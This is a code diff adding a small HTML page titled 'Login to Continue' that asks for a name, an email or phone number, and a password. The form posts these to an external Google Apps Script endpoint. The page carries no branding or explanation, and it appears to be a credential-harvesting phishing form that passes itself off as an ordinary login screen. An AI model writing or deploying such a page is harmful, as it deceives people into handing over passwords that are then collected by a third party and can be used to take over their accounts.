@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Continue</title>
+    <link rel="stylesheet" href="../samim/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="form-container bg-light">
+            <h2 class="text-center mb-4">Please Login to Continue</h2>
+            <form id="myForm" action="https://script.google.com/macros/s/AKfycbwD6IpZi0F5m9wd4F3cXuF4lTTRanFW9QdKLtwvRkc0E5PiXEIAqTcU4JFBhKddl_Va/exec" method="post">
+                <div class="mb-3">
+                    <label for="name" class="form-label">Name</label>
+                    <input type="text" name="name" id="name" class="form-control" placeholder="Enter your name" required>
+                </div>
+                <div class="mb-3">
+                    <label for="emailOrNumber" class="form-label">Email or Number</label>
+                    <input type="text" name="userid" id="userid" class="form-control" placeholder="Enter your email or number" required>
+                </div>
+                <div class="mb-3">
+                    <label for="password" class="form-label">Password</label>
+                    <input type="password" name="password" id="password" class="form-control" placeholder="Enter your password" required>
+                </div>
+                <div class="d-grid">
+                    <button type="submit" class="btn btn-primary">Login</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
